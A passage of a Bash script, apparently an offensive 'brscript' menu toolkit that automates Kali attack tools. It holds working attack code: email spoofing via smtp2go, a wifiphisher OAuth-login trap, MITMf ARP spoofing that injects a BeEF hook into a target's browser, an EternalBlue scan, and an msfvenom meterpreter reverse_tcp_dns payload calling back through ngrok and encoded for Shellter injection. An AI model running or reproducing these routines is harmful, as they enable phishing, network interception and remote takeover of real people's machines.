	fi
	echo -e "RHOST:("$BS"if scanning multiple hosts, seperate with space"$CE") "
	read RHOSTL
	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function start_menu
{
	O1=0
	O2=0
	O3=0
	echo -e "Enabling $WLANNM..."
	enable_wlan
	echo -e "Killing services..."
	airmon-ng check kill &> /dev/null && echo -e ""$YS"Done"$CE"" && O1=1
	echo -e "Starting monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		ifconfig $WLANN down
		iwconfig $WLANN mode monitor &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
		ifconfig $WLANN up
	else
		airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
	fi
	if [[ -f "$LPATH"/settings/startmac.txt ]]
	then
		read STARTMAC < "$LPATH"/settings/startmac.txt
	else
		STARTMAC="$DEFMAC"
	fi
	echo -e "Changing mac address of $WLANNM to "$STARTMAC"..."
	ifconfig $WLANNM down
	macchanger -m $STARTMAC $WLANNM &> /dev/null | grep "New MAC:" &> /dev/null && O3=1
	ifconfig $WLANNM up && echo -e ""$YS"Done"$CE"" 
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 && "$O4" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_menu
{
	O1=0
	O2=0
	O3=0
	stop_monitor
	echo -e "Changing mac address of $WLANN to the original one..."
	ifconfig $WLANN down
	macchanger -p $WLANN | grep "Current MAC:" && O1=1
	ifconfig $WLANN up
	echo -e ""$YS"Done"$CE""
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_monitor
{
	echo -e "Disabling $WLANNM..."
	echo -e "Stopping monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		A1=0
		A2=0
		A3=0
		ifconfig $WLANN down && A1=1
		iwconfig $WLANN mode managed && A2=1
		ifconfig $WLANN up && A3=1
		if [[ "$A1" = 1 && "$A2" = 1 && "$A3" = 1 ]]
		then
			echo -e ""$YS"Done"$CE"" && O2=1
		else
			echo -e ""$RS"Error stoping monitor mode."$CE""
		fi
	else
		airmon-ng stop $WLANNM &>/dev/null && echo -e ""$YS"Done"$CE"" && O2=1 || echo -e ""$RS"Error stoping monitor mode."$CE""
	fi
	echo -e "Starting network-manager service..."
	service network-manager start && echo -e ""$YS"Done"$CE"" && O3=1 || echo -e ""$RS"Error starting network-manager service"$CE""
}
function spoof_email
{
while true
do
	sm=0
	clear
	if [[ ! -d /bin/brscript/smtp ]]
	then
		mkdir /bin/brscript/smtp
	fi
	echo -e ""$RS"YOU SHOULD FIRST SIGN UP ON https://www.smtp2go.com AND VERIFY YOUR EMAIL."$CE""
	echo -e ""$RS"THEN GO TO https://app.smtp2go.com/settings/users AND MAKE A USERNAME AND PASS."$CE""
	echo -e ""$RS"      ########ALWAYS HAVE PERMISSION OF THE EMAILS YOU SPOOF########"$CE""
	echo -e ""$RS"      ########DONT SEND VIRUSES , PHISHING OR ILLEGAL THINGS########"$CE""
	if [[ ! -f /bin/brscript/smtp/smtpemail.txt ]]
	then
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     "$RS"NOT SET"$CE""
	else
		read smtpemail < /bin/brscript/smtp/smtpemail.txt
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     Current: "$YS""$smtpemail""$CE""
	fi
	echo -e ""$YS" 2"$CE") Send a spoofed email"
	echo -e ""$YS" 3"$CE") Clear your SMTP username and pass from brscript"
	echo -e ""$YS" 4"$CE") Fix email failed"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	read SMTP
	if [[ "$SMTP" = "1" ]]
	then
		clear
		echo -e "Enter your smtp username(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPEMAIL
		echo -e "Enter your smtp password(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPPASS
		clear
		echo "$SMTPEMAIL" > /bin/brscript/smtp/smtpemail.txt
		echo "$SMTPPASS" > /bin/brscript/smtp/smtppass.txt 
		echo -e "Credentials saved on /bin/brscript/smtp"
		sleep 3
	elif [[ "$SMTP" = "4" ]]
	then
		clear	
		echo -e "If you email fails, the reason is because on option 1 you didnt set the correct username and password. Find those at https://app.smtp2go.com/settings/users."
		sleep 2
		echo -e "$PAKTGB"
		read -e -n 1 -r
	elif [[ "$SMTP" = "3" ]]
	then
		if [[ -f /bin/brscript/smtp/smtpemail.txt ]]
		then
			rm /bin/brscript/smtp/smtpemail.txt
			echo -e "Username removed"
		else
			echo -e "Not username found"
		fi
		if [[ -f /bin/brscript/smtp/smtppass.txt ]]
		then
			rm /bin/brscript/smtp/smtppass.txt
			echo -e "Password removed"
		else
			echo -e "Not password found"
		fi
		sleep 2
		continue
	elif [[ "$SMTP" = "0" ]]
	then
		clear
		exit
	elif [[ "$SMTP" = "back" || "$SMTP" = "b" ]]
	then
		clear
		break
	elif [[ "$SMTP" = "2" ]]
	then
		while true
		do
		clear
		if [[ ! -f /bin/brscript/smtp/smtpemail.txt ]]
		then
			echo -e "No smtp username found."
			sm=1
		fi
		if [[ ! -f /bin/brscript/smtp/smtppass.txt ]]
		then
			echo -e "No smtp pass found."
			sm=1
		fi
		if [[ "$sm" = 1 ]]
		then
			break
		fi
		read smtppass < /bin/brscript/smtp/smtppass.txt
		read smtpemail < /bin/brscript/smtp/smtpemail.txt
		clear
		echo -e "Your username is "$RS""$smtpemail""$CE""
		echo -e ""
		echo -e "Enter the target's email: "
		read TARGETSEMAIL
		echo -e "Enter the email that you want the target to see: "
		read SPOOFEDEMAIL
		echo -e "Enter the subject of the message: "
		read SUBJECTEMAIL
		echo -e "Enter the message: "
		read MESSAGEEMAIL
		echo -e "Enter the smtp server ("$YS"Enter"$CE"=mail.smtp2go.com): "
		read SMTPSERVER
		if [[ "$SMTPSERVER" = "" ]]
		then
			SMTPSERVER="mail.smtp2go.com"
		fi
		echo -e "Enter the smtp port ("$YS"Enter"$CE"=2525): "
		read SMTPPORT
		if [[ "$SMTPPORT" = "" ]]
		then
			SMTPPORT="2525"
		fi
		echo -e "Press "$YS"enter"$CE" to send the message to "$TARGETSEMAIL""
		read 
		clear
		sendemail -f $SPOOFEDEMAIL -t $TARGETSEMAIL -u $SUBJECTEMAIL -m $MESSAGEEMAIL -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpemail" -xp "$smtppass"
		echo -e "$PAKTGB"
		read -e -n 1 -r
		break
		done
	fi
done
}
function new_terminal
{
		while true
		do
		clear
		if [[ "$ALFA" = "yes" ]]
		then
			CHECKMON=$(iwconfig "$WLANN" | grep "Mode:Monitor")
		else
			CHECKMON=$(ifconfig | grep "$WLANNM")
		fi
		clear
		if [[ "$CHECKMON" = "" ]]
		then
			echo -e "Monitor mode is not enabled."
			echo -e ""
			echo -e "Do you want to enable monitor mode? "$YNYES": "
			read MONITOREN
			clear
			if [[ "$MONITOREN" = "n" ]]
			then
			#~ echo -e "Select 'start' or '2' to enable it"
				echo -e "$PAKTGB"
				$READAK
				clear
				exec bash "$0"
			else
				start_menu
				continue
			fi
		else
			if [[ "$YORNAA" = "10" ]]
			then
				echo -e "Moving into new terminal..."
				sleep 1
				FJC=0
				export FJC
				gnome-terminal --geometry 87x35+9999+0 -- br1
				sleep 1
				exec bash "$0"
				break
			elif [[ "$YORNAA" = "11" ]]
			then
				clear
				echo -e "Moving into new terminal..."
				sleep 1
				gnome-terminal --geometry 80x25+9999+0 -- br3
				sleep 1
				exec bash "$0"
				break
			elif [[ "$YORNAA" = "12" ]]
			then
				echo -e "Moving into new terminal..."
				sleep 1
				gnome-terminal --geometry 80x25+9999+0 -- br4
				sleep 1
				exec bash "$0"
				break
			fi
		fi
		done
}
function check_if_ks
{
	while [ $var1 -le $HOWMANY ]
	do
		if [[ -f "$KSPATH"/nums/"$var1".txt ]]
		then
			read TITLE < "$KSPATH"/nums/"$var1".txt
			read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$YORNAA" = "$YORNAKS" ]]
			then
				read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
				read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
				$COMMAND1
				#~ if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"3.txt" ]]
				#~ then
					#~ read $COMMAND3 < ""$KSPATH"/"$TITLE"/"$TITLE"3.txt"
					#~ $COMMAND3
				#~ fi
				$COMMAND2
				BACKL="1"
			fi
		fi
		var1=$(( var1+1 ))
	done
}
function wififb
{
	echo -e "Enter the name of the access point you want to create: "
	read -e ESSIDAP
	export ESSIDAP
	xterm -hold -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
}
function mitmf_hook
{
	TERMINALTITLE="MITMF + BEEF"
	dash_calc
	printf '\033]2;MITMF + BEEF\a'
	if [[ -d /root/MITMf ]]
	then
		TEST=$(ifconfig | grep "$ETH")
		n=1
		echo -e ""$BS"Available interfaces"$CE": "
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") "$ETH""
			in[$n]="$ETH"
			n=$((n+1))
		fi
		TEST=$(ifconfig | grep "$WLANN")
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") $WLANN"
			in[$n]="$WLANN"
			n=$((n+1))
		fi
		TEST=$(ifconfig | grep "$WLANNM")
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") $WLANNM"
			in[$n]="$WLANNM"
			n=$((n+1))
		fi
		echo -e "Choose: "
		read ints
		if [[ "$ints" -le "$n" && "$ints" -ge 1 ]]
		then
			#~ echo -e "You selected "$YS"${in[$ints]}"$CE"" #debugging
			mitmfint="${in[$ints]}"
			export mitmfint
			clear
			mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
			export mitmfgate
			clear
			echo -e "Target's IP: "
			read mitmftar
			TEST=$(ifconfig | grep $mitmfint)
			if [[ $TEST != "" ]]
			then
				iffile=""$LPATH"/iftemp.txt"
				ifconfig $mitmfint > $iffile
				mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			fi
			clear
			echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
			read hookch
			if [[ "$hookch" = "" ]]
			then
				mitmfhook="http://"$mitmflocalip":3000/hook.js"
			else
				mitmfhook="$hookch"
			fi
			export mitmfhook
			cd /root/MITMf
			clear
			python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
			cd
		fi
	else
		echo -e ""$RS"Mitmf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			echo -e ""$RS"No installation added yet"$CE""
			sleep 2
		fi
	fi
	cd
}
function find_gateways()
{
	FG1="$1"
	FG2="$2"
	if [[ "$FG1" = "" ]]
	then
		echo -e ""$BS"Gateways"$CE": "
		n=0
		ethr=$(ifconfig | grep "$ETH")
		if [[ "$ethr" != "" ]]
		then
			ethd=$(route -n | awk -v int1="$ETH" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$ethd")
			if [[ "$ethd" != "" && "$chi" = 1 ]]
			then
				echo -e ""$ETH" = "$YS""$ethd""$CE""
				n=1
			fi
		fi
		wlanr=$(ifconfig | grep "$WLANN")
		if [[ "$wlanr" != "" ]]
		then
			wland=$(route -n | awk -v int1="$WLANN" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$wland")
			if [[ "$wland" != "" && "$chi" = 1 ]]
			then
				echo -e ""$WLANN" = "$YS""$wland""$CE""
				n=1
			fi
		fi
		wlanmr=$(ifconfig | grep "$WLANNM")
		if [[ "$wlanmr" != "" ]]
		then
			wlanmd=$(route -n | awk -v int1="$WLANNM" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
			chi=$(is_it_an_ip "$wlanmd")
			if [[ "$wlanmd" != "" && "$chi" = 1 ]]
			then
				echo -e ""$WLANNM" = "$YS""$wlanmd""$CE""
				n=1
			fi
		fi
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"No known interfaces found available"$CE""
		fi
	else
		if [[ "$FG2" = "interface" ]]
		then
			inttos=$(ifconfig | grep "$FG1")
			if [[ "$inttos" != "" ]]
			then
				gate=$(route -n | awk -v int1="$FG1" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
				cho=$(is_it_an_ip "$gate")
				if [[ "$cho" = 1 ]]
				then
					echo "$gate"
				fi
			else
				echo 0
			fi
		#~ elif [[ "$FG2" = "ip" ]]
		#~ then
			#~ iptos=$(ifconfig | grep "$FG1")
			#~ if [[ "$iptos" != "" ]]
			#~ then
				#~ dot=$(give_ip_take_zero "$FG1" "dot")
				#~ gate=$(route -n | awk -v int1="$dot" '{if(int1~$8 && $2!="IP" && $2!="0.0.0.0"){print $2}}')
				#~ echo "$gate"
				#~ cho=$(is_it_an_ip "$gate")
				#~ if [[ "$cho" = 1 ]]
				#~ then
					#~ echo "$gate"
				#~ fi
			#~ else
				#~ echo 0
			#~ fi
		#~ else
			#~ echo -e ""$RS"Could not identify 2nd parameter"$CE""
			#~ sleep 4
		fi		
	fi
}
function donate_option
{
	while true
	do
	clear
	TERMINALTITLE="DONATION"
	dash_calc
	printf '\033]2;DONATION\a'
	echo -e "If you found my script useful, you can buy me a coffee :)"
	echo -e "Total brscript donations: $DONATIONS"
	echo -e ""$YS" 1"$CE") Open browser to donate"
	echo -e ""$YS" 2"$CE") Copy donation link"
	echo -e ""$YS" b"$CE") I don't care about your work! :P"
	echo -e "Choose: "
	read DON
	if [[ "$DON" = "1" ]]
	then
		xdg-open "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
	elif [[ "$DON" = "2" ]]
	then
		echo -e "Donation link: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$DON" = "back" || "$DON" = "b" || "$DON" = "00" ]]
	then
		BACKL=1
		break
	elif [[ "$DON" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function ngrok_option
{
	while true
	do
		clear
		if [[ -f /root/ngrok ]]
		then
			TERMINALTITLE="NGROK"
			dash_calc
			printf '\033]2;NGROK\a'
			echo -e ""$YS"help"$CE") How to make it work?"
			echo -e ""$YS" 1"$CE") Open a tcp port"
			echo -e ""$YS" 2"$CE") Open a tls port"
			echo -e ""$YS" 3"$CE") Open a http port"
			echo -e ""$YS" 4"$CE") Intergrate with Shellter"
			echo -e ""$YS" 5"$CE") Set your ngrok authtoken"
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read NG
			clear
			if [[ "$NG" = "help" || "$NG" = "h" ]]
			then
				echo -e "With ngrok, you can port forward without router intergration."
				echo -e "It is free, HOWEVER:"
				echo -e "---to open a tcp port, you need to sign up (it's too easy)"
				echo -e "   Go to https://ngrok.com and choose "$YS"sign up"$CE"."
				echo -e "   When that's done, copy the given "$YS"authtoken"$CE"."
				echo -e "   (If you can't find it go to: https://dashboard.ngrok.com/auth )"
				echo -e "   Then select the 'set your authtoken' option in brscript, and paste it."
				echo -e "---to make a reverse tcp payload:"
				echo -e "   You need to set the payload to: windows/meterpreter/reverse_tcp_dns"
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$NG" = 1 || "$NG" = 2 || "$NG" = 3 ]]
			then
				echo -e "Type the local port to forward: "
				read PORTL
				if [[ "$NG" = 1 ]]
				then
					PROT="tcp"
				elif [[ "$NG" = 2 ]]
				then
					PROT="tls"
				else
					PROT="http"
				fi
				export PORTL
				export PROT
				xterm -geometry 85x15+9999+999999 -e bash -c './ngrok $PROT $PORTL; exec bash' & disown
			elif [[ "$NG" = 4 ]]
			then
				while true
				do
					clear
					echo -e ""$YS" 1"$CE") Make a raw tcp payload for Shellter"
					echo -e ""$YS" 2"$CE") How to intergrate it"
					echo -e ""$YS" b"$CE") Go back"
					echo -e "Choose:"
					read SHINT
					clear
					if [[ "$SHINT" = 1 ]]
					then
						while true
						do
							if [[ "$NGPORT" = "" ]]
							then
								NGPORT="\e[1;31mNONE\e[0m"
							fi
							clear
							echo -e ""$YS" 1"$CE") Set the Ngrok tcp port              CURRENT:"$NGPORT""
							#~ echo -e ""$YS" 2"$CE") Set your local tcp port             CURRENT:"$LPORT""
							echo -e ""$YS" b"$CE") Go back"
							echo -e ""$YS"run"$CE") Make the payload"
							echo -e "Choose: "
							read RP
							if [[ "$RP" = 1 ]]
							then
								echo -e "Ngrok port: "
								read NGPORT
							elif [[ "$RP" = "back" || "$RP" = "b" ]]
							then
								break
							elif [[ "$RP" = "run" ]]
							then
								RAW=rawfud
								NUMB=1
								while true
								do
									RAWN=""$RAW""$NUMB""
									if [[ -f /root/Desktop/"$RAWN".raw ]]
									then
										NUMB=$((NUMB+1))
									else
										break
									fi
								done
								msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=0.tcp.ngrok.io LPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/"$RAWN".raw
								sleep 2
								if [[ -f /root/Desktop/"$RAWN".raw ]]
								then
									clear
									echo -e "Payload was saved to /root/Desktop/"$RAWN".raw"
								fi
								echo -e "$PAKTGB"
								$READAK
							fi
						done
					elif [[ "$SHINT" = 2 ]]
					then
						echo -e "First you should make a raw payload with option 1."
						echo -e "Then open shellter and select your app to be injected."
						echo -e "Then, on stealth mode select y."
						echo -e "Select to type a custom payload, NOT listed."
						echo -e "Then type the path of the payload you have created on option 1."
						echo -e "For the listener, the payload is windows/meterpreter/reverse_tcp_dns"
						echo -e "LHOST is 127.0.0.1 and LPORT is the port you opened to ngrok."
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$SHINT" = "back" || "$SHINT" = "b" ]]
					then
						break
					fi
				done
			elif [[ "$NG" = "back" || "$NG" = "b" || "$NG" = "00" ]]
			then
				clear
				break
			elif [[ "$NG" = 0 ]]
			then
				clear
				exit
			elif [[ "$NG" = 5 ]]
			then
					echo -e "Type your authtoken: "
					read AUTHT
					if [[ "$AUTHT" != "" ]]
					then
						./ngrok authtoken $AUTHT
						echo -e "$PAKTGB"
						$READAK
					fi
			fi
		else
			echo -e ""$RS"Ngrok is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ngrok
			fi
		fi
	done
}
function geolocate_ip()
{
	A1="$1"
	AA1=$(is_it_an_ip "$A1")
	if [[ "$AA1" = 1 ]]
	then
		country=$(curl ipinfo.io/"$A1"/country 2>/dev/null)
		loc=$(curl ipinfo.io/"$A1"/loc 2>/dev/null)
		city=$(curl ipinfo.io/"$A1"/city 2>/dev/null)
		org=$(curl ipinfo.io/"$A1"/org 2>/dev/null)
		postal=$(curl ipinfo.io/"$A1"/postal 2>/dev/null)
		region=$(curl ipinfo.io/"$A1"/region 2>/dev/null)
		hostname=$(curl ipinfo.io/"$A1"/hostname 2>/dev/null)
		echo -e "     Country: $country"
		echo -e "      Region: $region"
		echo -e "    Location: $loc"
		echo -e "        City: $city"
		echo -e "      Postal: $postal"
		echo -e "    Hostname: $hostname"
		echo -e "Organization: $org"
		echo -e ""$YS" m"$CE") Open google maps location"
		echo -e ""$YS" *"$CE") Go back"
		echo -e "Choose: "
		read ge
		if [[ "$ge" = "m" ]]
		then
			xdg-open https://www.google.gr/maps/search/"$loc"/
		else
			clear
			BACKL=1
		fi
	else
		echo 0
	fi
}
function ip_scan()
{
	
while true
do
	#passing interface
	IPF=$1
	#passing mode if any
	MODE=$2
	export IPF
	if [[ "$IPF" = "" ]]
	then
		echo -e ""$RS"Error 6. No parameters passed"$CE""
		sleep 3
		break
	fi
	#getting local ip
	LLL=$(local_ips $IPF)
	#getting zero ip
	ZERO=$(give_ip_take_zero $LLL)
	export ZERO
	echo -e ""$BS"Scanning, please wait..."$CE""
	tempfile=""$LPATH"/tempscan.txt"
	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee "$tempfile""
	clear
	######
	T1=$(cat "$tempfile" | grep "Ending arp-scan")
	if [[ "$T1" = "" ]]
	then
		#Sould rescan
		echo -e ""$RS"Common error, retrying..."$CE""
		sleep 2
		clear
		continue
	else
		lines=$(cat $tempfile | awk 'END{print NR}')
		hosts=$((lines-5))
		if [[ "$hosts" -le 0 ]]
		then
			echo -e ""$RS"No hosts found"$CE""
			sleep 2
			break
		else
			echo -e ""$BS"Host(s) found:"$CE""
			##########
			n=1
			n2=2
			while [[ "$n" -le "$hosts" ]]
			do
				#Hosts start from line 3
				n1=$((n2+n))
				host[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1 && $0 !~ /DUP:/){print $1}}')
				if [[ "${host[$n]}" = "" ]]
				then
					#sometimes there are duplicate IPs.This should remove them.
					n2=$((n2+1))
					hosts=$((hosts-1))
					#~ n=$((n+1))
					continue
				fi
				size=${#host[$n]}
				sized=$((20-size))
				SPACESN=" "
				numcalc=1
				while [ $numcalc != $sized ]
				do
					SPACESN=""${SPACESN}" "
					numcalc=$(( numcalc+1 ))
				done
				mi[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $2}}')
				im[$n]=$(cat "$tempfile" | awk -v an1="$n1" '{if(NR==an1){print $3}}')
				if [[ "$MODE" = 1 ]]
				then
					echo -e ""$YS" $n"$CE") "${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
				else
					echo -e ""${host[$n]}"${SPACESN}"${mi[$n]}"       "${im[$n]}""
				fi
				n=$((n+1))
			done
			if [[ "$MODE" = 1 ]]
			then
				echo -e ""$YS" r"$CE") Rescan"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read sch
				if [[ "$sch" = "b" ]]
				then
					echo ""
				elif [[ "$sch" = "r" ]]
				then
					clear
					continue
				elif [[ "$sch" -le "$hosts" && "$sch" -ge 1 ]]
				then
					OUTPUT="${host[$sch]}"
					export OUTPUT
					#~ echo "$OUTPUT"
				fi
			fi
			##########
		fi
		break
	fi
	######
done

}
function browser_exploiting
{
	if [[ ! -f /usr/bin/arp-scan ]]
	then
		echo -e ""$BS"Installing arp-scan"$CE""
		install_arp_scan
		clear
	fi
	TAR=""
	SINT=""
	beefrunning=0
	clear
	while true
	do
		clear
		TERMINALTITLE="Auto-exploit browser"
		dash_calc
		printf '\033]2;AUTO-EXPLOIT BROWSER\a'
		if [[ "$SINT" = "" ]]
		then
			WL=$(ifconfig | grep "$WLANN:")
			if [[ "$WL" != "" ]]
			then
				SINT="$WLANN"
				inter=0
			else
				EL=$(ifconfig | grep "$ETH:")
				if [[ "$EL" != "" ]]
				then
					SINT="$ETH"
					inter=0
				else
					SINT=""$RS"Not found"$CE""
					inter=1
				fi
			fi
			
		fi
		if [[ "$TAR" = "" ]]
		then
			TAR=""$RS"Not set"$CE""
			tarer=1
		fi
		echo -e ""$YS" 1"$CE") Select interface                CURRENT:"$YS""$SINT""$CE""
		echo -e ""$YS" 2"$CE") Select target                   CURRENT:"$YS""$TAR""$CE""
		echo -e ""$YS" 3"$CE") Start BeEF"
		echo -e ""$YS" 4"$CE") Open BeEF's ui panel in browser"
		echo -e ""$YS" 5"$CE") Start MITMf"
		echo -e ""$YS" 6"$CE") Fix errors"
		#~ echo -e ""$YS" 4"$CE") Close all windows"
		echo -e ""$YS" i"$CE") Info"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read AEB
		clear
		if [[ "$AEB" = "b" || "$AEB" = 00 ]]
		then
			clear
			BACKL=1
			break
		elif [[ "$AEB" = "i" ]]
		then
			clear
			echo -e ""$LGYS"On this menu you can exploit and control browsers on your network."
			echo -e "Instructions: "
			echo -e "BeEF:"
			echo -e "	First you need to specify an interface. Then start BeEF."
			echo -e "	Then open the UI panel and log in with beef:beef ."
			echo -e "	There you will see if any online browsers."
			echo -e "MITMf:"
			echo -e "	First you need to specify an interface and a target. Then start MITMf."
			echo -e "	MITMf tries to inject the hook.js javascript to the target's website."$CE""
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$AEB" = 6 ]]
		then
			while true
			do
			clear
			TERMINALTITLE="Fix errors"
			dash_calc
			printf '\033]2;FIX ERRORS\a'
			echo -e ""$YS" 1"$CE") MITMf error: Another process running on port 53"
			echo -e ""$YS" 2"$CE") BeEF  error: Another process listening on port 3000"
			echo -e ""$YS" 3"$CE") MITMf error: Could not resolve Gateway's MAC"
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read AE
			clear
			if [[ "$AE" = 1 ]]
			then
				#~ echo -e "For this error, you need to type "$YS"netstat -lnpu | grep :53"$CE" to find the process that runs
				#~ on port 53 and kill it by "$YS"kill <PID>"$CE""
				PID1=$(lsof -t -i:53)
				if [[ "$PID1" = "" ]]
				then
					echo -e ""$RS"Could not find the process running on port 53"$CE""
				else
					kill $PID1 && echo -e ""$YS"Fixed."$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 2 ]]
			then
				echo -e "You are facing this error because you did not press "$YS"ctrl c"$CE" on BeEF's window
				to close it."
				echo -e ""
				PID1=$(lsof -t -i:3000)
				if [[ "$PID1" = "" ]]
				then
					echo -e ""$RS"Could not find the process running on port 3000"$CE""
				else
					kill $PID1 && echo -e ""$YS"Fixed."$CE""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 3 ]]
			then
				echo -e "I cannot fix this error. It is not my script's error but MITMf's. You can try changing interface, changing network or retrying. "
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = "b" ]]
			then
				clear
				break
			fi
			done
		elif [[ "$AEB" = 4 ]]
		then
			#make sure BeEF is running.
			if [[ "$beefrunning" = 0 ]]
			then
				echo -e ""$RS"BeEF is not running"$CE""
				sleep 3
			else
				clear
				export SINT
				LOC=$(local_ips $SINT)
				export LOC
				CONF=$(is_it_an_ip $LOC)
				if [[ "$CONF" = 1 ]]
				then
					xdg-open http://"$LOC":3000/ui/panel
				else
					echo -e ""$RS"Could not find your local IP"$CE""
					sleep 3
				fi
			fi
		elif [[ "$AEB" = 2 ]]
		then
			if [[ "$inter" != 1 ]]
			then
				clear
				while true
				do
					clear
					TERMINALTITLE="Select target"
					dash_calc
					printf '\033]2;SELECT TARGET\a'
					echo -e ""$YS" 1"$CE") Scan and choose"
					echo -e ""$YS" 2"$CE") Type target's IP"
					echo -e ""$YS" b"$CE") Go back"
					echo -e "Choose: "
					read TARR
					clear
					if [[ "$TARR" = "b" ]]
					then
						break
					elif [[ "$TARR" = 1 ]]
					then
						ip_scan $SINT 1
						TARGETI="$OUTPUT"
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							tarer=1
						fi
						break
					elif [[ "$TARR" = 2 ]]
					then
						echo -e "Target: "
						read TARGETI
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							echo -e ""$RS"Invalid IP"$CE""
							tarer=1
							sleep 2
						fi
						break
					fi
				done
			else
				echo -e ""$RS"Select interface first"$CE""
				sleep 2
			fi
		elif [[ "$AEB" = 5 ]]
		then
			if [[ "$inter" = 0 && "$tarer" = 0 ]]
			then
				if [[ -d /root/MITMf ]]
				then
						mitmfint="$SINT"
						export mitmfint
						clear
						mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
						isit=$(is_it_an_ip "$mitmfgate")
						if [[ "$mitmfgate" != "" && "$isit" = 1 ]]
						then
							export mitmfgate
							clear
							TEST=$(ifconfig | grep $mitmfint)
							if [[ $TEST != "" ]]
							then
								iffile=""$LPATH"/iftemp.txt"
								ifconfig $mitmfint > $iffile
								mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
							else
								echo -e ""$RS"ERROR 5. Could not find your local IP. Make sure you are connected to a network on interface "$SINT""$CE""
								echo -e "$PAKTGB"
								$READAK
								continue
							fi
							clear
							echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
							read hookch
							if [[ "$hookch" = "" ]]
							then
								mitmfhook="http://"$mitmflocalip":3000/hook.js"
							else
								mitmfhook="$hookch"
							fi
							export mitmfhook
							cd /root/MITMf
							clear
							xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"
							cd
						else
							echo -e ""$RS"ERROR 4. Could not find gateway. Make sure you are connected to a network on interface "$SINT""$CE""
							echo -e "$PAKTGB"
							$READAK
						fi
				else
					echo -e ""$RS"Mitmf is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."
					read INSTALL
